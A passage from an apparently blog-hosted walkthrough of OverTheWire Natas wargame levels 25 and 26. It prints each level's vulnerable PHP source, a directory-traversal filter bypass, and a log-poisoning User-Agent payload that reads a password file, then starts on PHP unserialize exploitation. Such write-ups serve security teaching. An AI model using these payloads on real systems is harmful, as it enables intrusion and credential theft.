<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class='line'>    <span class="c1">// cheers and &lt;3 to malvina</span>
</span><span class='line'>    <span class="c1">// - morla</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">function</span> <span class="nf">setLanguage</span><span class="p">(){</span>
</span><span class='line'>        <span class="cm">/* language setup */</span>
</span><span class='line'>        <span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;lang&quot;</span><span class="p">,</span><span class="nv">$_REQUEST</span><span class="p">))</span>
</span><span class='line'>            <span class="k">if</span><span class="p">(</span><span class="nx">safeinclude</span><span class="p">(</span><span class="s2">&quot;language/&quot;</span> <span class="o">.</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;lang&quot;</span><span class="p">]</span> <span class="p">))</span>
</span><span class='line'>                <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'>        <span class="nx">safeinclude</span><span class="p">(</span><span class="s2">&quot;language/en&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">function</span> <span class="nf">safeinclude</span><span class="p">(</span><span class="nv">$filename</span><span class="p">){</span>
</span><span class='line'>        <span class="c1">// check for directory traversal</span>
</span><span class='line'>        <span class="k">if</span><span class="p">(</span><span class="nx">strstr</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span><span class="s2">&quot;../&quot;</span><span class="p">)){</span>
</span><span class='line'>            <span class="nx">logRequest</span><span class="p">(</span><span class="s2">&quot;Directory traversal attempt! fixing request.&quot;</span><span class="p">);</span>
</span><span class='line'>            <span class="nv">$filename</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;../&quot;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="nv">$filename</span><span class="p">);</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>        <span class="c1">// dont let ppl steal our passwords</span>
</span><span class='line'>        <span class="k">if</span><span class="p">(</span><span class="nx">strstr</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span><span class="s2">&quot;natas_webpass&quot;</span><span class="p">)){</span>
</span><span class='line'>            <span class="nx">logRequest</span><span class="p">(</span><span class="s2">&quot;Illegal file access detected! Aborting!&quot;</span><span class="p">);</span>
</span><span class='line'>            <span class="k">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>        <span class="c1">// add more checks...</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">if</span> <span class="p">(</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$filename</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>            <span class="k">include</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
</span><span class='line'>            <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">function</span> <span class="nf">listFiles</span><span class="p">(</span><span class="nv">$path</span><span class="p">){</span>
</span><span class='line'>        <span class="nv">$listoffiles</span><span class="o">=</span><span class="k">array</span><span class="p">();</span>
</span><span class='line'>        <span class="k">if</span> <span class="p">(</span><span class="nv">$handle</span> <span class="o">=</span> <span class="nb">opendir</span><span class="p">(</span><span class="nv">$path</span><span class="p">))</span>
</span><span class='line'>            <span class="k">while</span> <span class="p">(</span><span class="k">false</span> <span class="o">!==</span> <span class="p">(</span><span class="nv">$file</span> <span class="o">=</span> <span class="nb">readdir</span><span class="p">(</span><span class="nv">$handle</span><span class="p">)))</span>
</span><span class='line'>                <span class="k">if</span> <span class="p">(</span><span class="nv">$file</span> <span class="o">!=</span> <span class="s2">&quot;.&quot;</span> <span class="o">&amp;&amp;</span> <span class="nv">$file</span> <span class="o">!=</span> <span class="s2">&quot;..&quot;</span><span class="p">)</span>
</span><span class='line'>                    <span class="nv">$listoffiles</span><span class="p">[]</span><span class="o">=</span><span class="nv">$file</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>        <span class="nb">closedir</span><span class="p">(</span><span class="nv">$handle</span><span class="p">);</span>
</span><span class='line'>        <span class="k">return</span> <span class="nv">$listoffiles</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">function</span> <span class="nf">logRequest</span><span class="p">(</span><span class="nv">$message</span><span class="p">){</span>
</span><span class='line'>        <span class="nv">$log</span><span class="o">=</span><span class="s2">&quot;[&quot;</span><span class="o">.</span> <span class="nb">date</span><span class="p">(</span><span class="s2">&quot;d.m.Y H::i:s&quot;</span><span class="p">,</span><span class="nb">time</span><span class="p">())</span> <span class="o">.</span><span class="s2">&quot;]&quot;</span><span class="p">;</span>
</span><span class='line'>        <span class="nv">$log</span><span class="o">=</span><span class="nv">$log</span> <span class="o">.</span> <span class="s2">&quot; &quot;</span> <span class="o">.</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_USER_AGENT&#39;</span><span class="p">];</span>
</span><span class='line'>        <span class="nv">$log</span><span class="o">=</span><span class="nv">$log</span> <span class="o">.</span> <span class="s2">&quot; </span><span class="se">\&quot;</span><span class="s2">&quot;</span> <span class="o">.</span> <span class="nv">$message</span> <span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;\n</span><span class="s2">&quot;</span><span class="p">;</span>
</span><span class='line'>        <span class="nv">$fd</span><span class="o">=</span><span class="nb">fopen</span><span class="p">(</span><span class="s2">&quot;/tmp/natas25_&quot;</span> <span class="o">.</span> <span class="nb">session_id</span><span class="p">()</span> <span class="o">.</span><span class="s2">&quot;.log&quot;</span><span class="p">,</span><span class="s2">&quot;a&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fd</span><span class="p">,</span><span class="nv">$log</span><span class="p">);</span>
</span><span class='line'>        <span class="nb">fclose</span><span class="p">(</span><span class="nv">$fd</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>At first it would seem that we have to find a way to traverse to <code>/etc/natas_webpass</code> and read the password from there, however there is a check in the code to prevent us from going there. So I next looked at bypassing the LFI filter and played a bit in a PHP sandbox to see which injection would work against the filter. Finally, I was able to read the log file with this injection: <code>lang=&hellip;.//&hellip;.//&hellip;.//&hellip;.//&hellip;.//tmp/natas25_6n8g6cuqkbuthmp8usvql1vej2.log</code></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[17.10.2015 14::02:27] Mozilla/5.0 (X11; Linux x86_64; rv:40.0) Gecko/20100101 Firefox/40.0 "Directory traversal attempt! fixing request." [17.10.2015 14::02:38] Mozilla/5.0 (X11; Linux x86_64; rv:40.0) Gecko/20100101 Firefox/40.0 "Directory traversal attempt! fixing request."
</span><span class='line'>Notice: Undefined variable: __GREETING in /var/www/natas/natas25/index.php on line 80
</span><span class='line'>
</span><span class='line'>Notice: Undefined variable: __MSG in /var/www/natas/natas25/index.php on line 81
</span><span class='line'>
</span><span class='line'>Notice: Undefined variable: __FOOTER in /var/www/natas/natas25/index.php on line 82</span></code></pre></td></tr></table></div></figure>


<p>Excellent, now we&rsquo;re getting somewhere! The next technique we&rsquo;ll use to get the password is a log poisoning attack. Read more <a href="http://hackerforhire.com.au/apache-log-poisoning-with-local-file-inclusion/">here</a></p>

<p>If you look at the <em>logRequest</em> function you will see that it appends various information to a log file. Part of this information is under our control (the User Agent). By using the log poisoning attack, we can change the User Agent to some PHP code of our choosing, that will then get written to the log file when we do an action which should be logged. And when the server reads the log file, it will happily execute the code contained within. Let&rsquo;s see this in practice:</p>

<ul>
<li><p>I changed my user agent to <code>&lt;?php readfile(&lsquo;/etc/natas_webpass/natas26&rsquo;); ?></code></p></li>
<li><p>Then I refreshed the page where I was looking at the log file and among all the logged information was also the password:</p></li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>"Directory traversal attempt! fixing request." [17.10.2015 15::56:48] oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T </span></code></pre></td></tr></table></div></figure>


<p>The password is <code>oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T</code></p>

<h3>Level 26</h3>

<p><img class="center" src="http://chousensha.github.io/images/overthewire/natas/natas26.png" title="natas26" alt="natas 26"></p>

<p>Source code:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class='line'>    <span class="c1">// sry, this is ugly as hell.</span>
</span><span class='line'>    <span class="c1">// cheers kaliman ;)</span>
</span><span class='line'>    <span class="c1">// - morla</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">class</span> <span class="nc">Logger</span><span class="p">{</span>
</span><span class='line'>        <span class="k">private</span> <span class="nv">$logFile</span><span class="p">;</span>
</span><span class='line'>        <span class="k">private</span> <span class="nv">$initMsg</span><span class="p">;</span>
</span><span class='line'>        <span class="k">private</span> <span class="nv">$exitMsg</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">function</span> <span class="nf">__construct</span><span class="p">(</span><span class="nv">$file</span><span class="p">){</span>
</span><span class='line'>            <span class="c1">// initialise variables</span>
</span><span class='line'>            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">initMsg</span><span class="o">=</span><span class="s2">&quot;#--session started--#</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
</span><span class='line'>            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">exitMsg</span><span class="o">=</span><span class="s2">&quot;#--session end--#</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
</span><span class='line'>            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">logFile</span> <span class="o">=</span> <span class="s2">&quot;/tmp/natas26_&quot;</span> <span class="o">.</span> <span class="nv">$file</span> <span class="o">.</span> <span class="s2">&quot;.log&quot;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>            <span class="c1">// write initial message</span>
</span><span class='line'>            <span class="nv">$fd</span><span class="o">=</span><span class="nb">fopen</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">logFile</span><span class="p">,</span><span class="s2">&quot;a+&quot;</span><span class="p">);</span>
</span><span class='line'>            <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fd</span><span class="p">,</span><span class="nv">$initMsg</span><span class="p">);</span>
</span><span class='line'>            <span class="nb">fclose</span><span class="p">(</span><span class="nv">$fd</span><span class="p">);</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">function</span> <span class="nf">log</span><span class="p">(</span><span class="nv">$msg</span><span class="p">){</span>
</span><span class='line'>            <span class="nv">$fd</span><span class="o">=</span><span class="nb">fopen</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">logFile</span><span class="p">,</span><span class="s2">&quot;a+&quot;</span><span class="p">);</span>
</span><span class='line'>            <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fd</span><span class="p">,</span><span class="nv">$msg</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
</span><span class='line'>            <span class="nb">fclose</span><span class="p">(</span><span class="nv">$fd</span><span class="p">);</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">function</span> <span class="nf">__destruct</span><span class="p">(){</span>
</span><span class='line'>            <span class="c1">// write exit message</span>
</span><span class='line'>            <span class="nv">$fd</span><span class="o">=</span><span class="nb">fopen</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">logFile</span><span class="p">,</span><span class="s2">&quot;a+&quot;</span><span class="p">);</span>
</span><span class='line'>            <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fd</span><span class="p">,</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">exitMsg</span><span class="p">);</span>
</span><span class='line'>            <span class="nb">fclose</span><span class="p">(</span><span class="nv">$fd</span><span class="p">);</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">function</span> <span class="nf">showImage</span><span class="p">(</span><span class="nv">$filename</span><span class="p">){</span>
</span><span class='line'>        <span class="k">if</span><span class="p">(</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$filename</span><span class="p">))</span>
</span><span class='line'>            <span class="k">echo</span> <span class="s2">&quot;&lt;img src=</span><span class="se">\&quot;</span><span class="si">$filename</span><span class="se">\&quot;</span><span class="s2">&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">function</span> <span class="nf">drawImage</span><span class="p">(</span><span class="nv">$filename</span><span class="p">){</span>
</span><span class='line'>        <span class="nv">$img</span><span class="o">=</span><span class="nx">imagecreatetruecolor</span><span class="p">(</span><span class="mi">400</span><span class="p">,</span><span class="mi">300</span><span class="p">);</span>
</span><span class='line'>        <span class="nx">drawFromUserdata</span><span class="p">(</span><span class="nv">$img</span><span class="p">);</span>
</span><span class='line'>        <span class="nx">imagepng</span><span class="p">(</span><span class="nv">$img</span><span class="p">,</span><span class="nv">$filename</span><span class="p">);</span>
</span><span class='line'>        <span class="nx">imagedestroy</span><span class="p">(</span><span class="nv">$img</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">function</span> <span class="nf">drawFromUserdata</span><span class="p">(</span><span class="nv">$img</span><span class="p">){</span>
</span><span class='line'>        <span class="k">if</span><span class="p">(</span> <span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;x1&quot;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;y1&quot;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
</span><span class='line'>            <span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;x2&quot;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;y2&quot;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">)){</span>
</span><span class='line'>
</span><span class='line'>            <span class="nv">$color</span><span class="o">=</span><span class="nx">imagecolorallocate</span><span class="p">(</span><span class="nv">$img</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0x12</span><span class="p">,</span><span class="mh">0x1c</span><span class="p">);</span>
</span><span class='line'>            <span class="nx">imageline</span><span class="p">(</span><span class="nv">$img</span><span class="p">,</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;x1&quot;</span><span class="p">],</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;y1&quot;</span><span class="p">],</span>
</span><span class='line'>                            <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;x2&quot;</span><span class="p">],</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;y2&quot;</span><span class="p">],</span> <span class="nv">$color</span><span class="p">);</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">if</span> <span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;drawing&quot;</span><span class="p">,</span> <span class="nv">$_COOKIE</span><span class="p">)){</span>
</span><span class='line'>            <span class="nv">$drawing</span><span class="o">=</span><span class="nb">unserialize</span><span class="p">(</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s2">&quot;drawing&quot;</span><span class="p">]));</span>
</span><span class='line'>            <span class="k">if</span><span class="p">(</span><span class="nv">$drawing</span><span class="p">)</span>
</span><span class='line'>                <span class="k">foreach</span><span class="p">(</span><span class="nv">$drawing</span> <span class="k">as</span> <span class="nv">$object</span><span class="p">)</span>
</span><span class='line'>                    <span class="k">if</span><span class="p">(</span> <span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;x1&quot;</span><span class="p">,</span> <span class="nv">$object</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
</span><span class='line'>                        <span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;y1&quot;</span><span class="p">,</span> <span class="nv">$object</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
</span><span class='line'>                        <span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;x2&quot;</span><span class="p">,</span> <span class="nv">$object</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
</span><span class='line'>                        <span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;y2&quot;</span><span class="p">,</span> <span class="nv">$object</span><span class="p">)){</span>
</span><span class='line'>
</span><span class='line'>                        <span class="nv">$color</span><span class="o">=</span><span class="nx">imagecolorallocate</span><span class="p">(</span><span class="nv">$img</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0x12</span><span class="p">,</span><span class="mh">0x1c</span><span class="p">);</span>
</span><span class='line'>                        <span class="nx">imageline</span><span class="p">(</span><span class="nv">$img</span><span class="p">,</span><span class="nv">$object</span><span class="p">[</span><span class="s2">&quot;x1&quot;</span><span class="p">],</span><span class="nv">$object</span><span class="p">[</span><span class="s2">&quot;y1&quot;</span><span class="p">],</span>
</span><span class='line'>                                <span class="nv">$object</span><span class="p">[</span><span class="s2">&quot;x2&quot;</span><span class="p">]</span> <span class="p">,</span><span class="nv">$object</span><span class="p">[</span><span class="s2">&quot;y2&quot;</span><span class="p">]</span> <span class="p">,</span><span class="nv">$color</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>                    <span class="p">}</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">function</span> <span class="nf">storeData</span><span class="p">(){</span>
</span><span class='line'>        <span class="nv">$new_object</span><span class="o">=</span><span class="k">array</span><span class="p">();</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;x1&quot;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;y1&quot;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
</span><span class='line'>            <span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;x2&quot;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;y2&quot;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">)){</span>
</span><span class='line'>            <span class="nv">$new_object</span><span class="p">[</span><span class="s2">&quot;x1&quot;</span><span class="p">]</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;x1&quot;</span><span class="p">];</span>
</span><span class='line'>            <span class="nv">$new_object</span><span class="p">[</span><span class="s2">&quot;y1&quot;</span><span class="p">]</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;y1&quot;</span><span class="p">];</span>
</span><span class='line'>            <span class="nv">$new_object</span><span class="p">[</span><span class="s2">&quot;x2&quot;</span><span class="p">]</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;x2&quot;</span><span class="p">];</span>
</span><span class='line'>            <span class="nv">$new_object</span><span class="p">[</span><span class="s2">&quot;y2&quot;</span><span class="p">]</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;y2&quot;</span><span class="p">];</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">if</span> <span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;drawing&quot;</span><span class="p">,</span> <span class="nv">$_COOKIE</span><span class="p">)){</span>
</span><span class='line'>            <span class="nv">$drawing</span><span class="o">=</span><span class="nb">unserialize</span><span class="p">(</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s2">&quot;drawing&quot;</span><span class="p">]));</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>        <span class="k">else</span><span class="p">{</span>
</span><span class='line'>            <span class="c1">// create new array</span>
</span><span class='line'>            <span class="nv">$drawing</span><span class="o">=</span><span class="k">array</span><span class="p">();</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>        <span class="nv">$drawing</span><span class="p">[]</span><span class="o">=</span><span class="nv">$new_object</span><span class="p">;</span>
</span><span class='line'>        <span class="nx">setcookie</span><span class="p">(</span><span class="s2">&quot;drawing&quot;</span><span class="p">,</span><span class="nb">base64_encode</span><span class="p">(</span><span class="nb">serialize</span><span class="p">(</span><span class="nv">$drawing</span><span class="p">)));</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span><span class='line'>
</span><span class='line'><span class="cp">&lt;?php</span>
</span><span class='line'>    <span class="nb">session_start</span><span class="p">();</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;drawing&quot;</span><span class="p">,</span> <span class="nv">$_COOKIE</span><span class="p">)</span> <span class="o">||</span>
</span><span class='line'>        <span class="p">(</span>   <span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;x1&quot;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;y1&quot;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
</span><span class='line'>            <span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;x2&quot;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;y2&quot;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">))){</span>
</span><span class='line'>        <span class="nv">$imgfile</span><span class="o">=</span><span class="s2">&quot;img/natas26_&quot;</span> <span class="o">.</span> <span class="nb">session_id</span><span class="p">()</span> <span class="o">.</span><span class="s2">&quot;.png&quot;</span><span class="p">;</span>
</span><span class='line'>        <span class="nx">drawImage</span><span class="p">(</span><span class="nv">$imgfile</span><span class="p">);</span>
</span><span class='line'>        <span class="nx">showImage</span><span class="p">(</span><span class="nv">$imgfile</span><span class="p">);</span>
</span><span class='line'>        <span class="nx">storeData</span><span class="p">();</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>Code looks complicated so I&rsquo;m breaking it down in little pieces:</p>

<ul>
<li><p>We have a Logger class that writes some messages to a log file</p></li>
<li><p>the <em>showImage()</em> function sets the image tag source to the given filename, if that file exists</p></li>
<li><p>the <em>drawImage()</em> function creates an image and outputs it to the browser</p></li>
<li><p><em>drawFromUserdata()</em> uses the user-supplied coordinates to draw lines across the image</p></li>
<li><p><em>storeData()</em> populates an array with the 4 $_GET parameters and sets a cookie named <em>drawing</em> to contain the serialized and base64 encoded value of the previously created array</p></li>
</ul>


<p>So far, out of ideas, but when reading about <em>unserialize()</em> in the PHP manual, there was a security warning:</p>

<blockquote><p>Warning</p>

<p>Do not pass untrusted user input to unserialize(). Unserialization can result in code being loaded and executed due to object instantiation and
autoloading, and a malicious user may be able to exploit this. Use a safe, standard data interchange format such as JSON (via json_decode() and
json_encode()) if you need to pass serialized data to the user.</p></blockquote>

<p>Next I proceeded to read more about exploiting PHP unserialization, and there were quite a few resources available, so I must be on the right track :D And this also explained the existence of the Logger class, which isn&rsquo;t instantiated anywhere in the program. But first, we must understand what serialization is all about.</p>

<ul>
<li><p><em>string serialize ( mixed $value )</em></p></li>
<li><p>Generates a storable representation of a value. This is useful for storing or passing PHP values around without losing their type and structure. Returns a binary string containing a byte-stream representation of value that can be stored anywhere.</p></li>
</ul>


